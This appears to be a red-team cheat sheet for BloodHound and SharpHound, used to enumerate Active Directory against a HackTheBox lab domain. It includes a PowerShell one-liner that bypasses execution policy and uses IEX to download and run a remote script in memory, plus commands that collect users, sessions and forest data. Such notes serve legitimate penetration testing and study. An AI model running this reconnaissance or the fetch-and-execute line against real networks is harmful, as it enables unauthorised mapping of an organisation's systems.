# Bloodhound

**Installation**: 

```text
apt install bloodhound  
neo4j console 
Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j 
./bloodhound 
```

**Collection examples:** 

`Execute-assembly SharpHound.exe` 

`powershell -exec bypass -c IEX (iwr 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-Bloodhound -CollectionMethod all,loggedon` 

`SharpHound.exe (from resources/Ingestor)` 

`SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100` 

`SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100` 

  
 `SharpHound.exe -c all -d active.htb -SearchForest` 

`SharpHound.exe --EncryptZip --ZipFilename export.zip`   
   
`Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public` 

**Collection Linux:** 

[https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)

Guides and resources: 

[https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/) 

[https://en.hackndo.com/bloodhound/](https://en.hackndo.com/bloodhound/) 

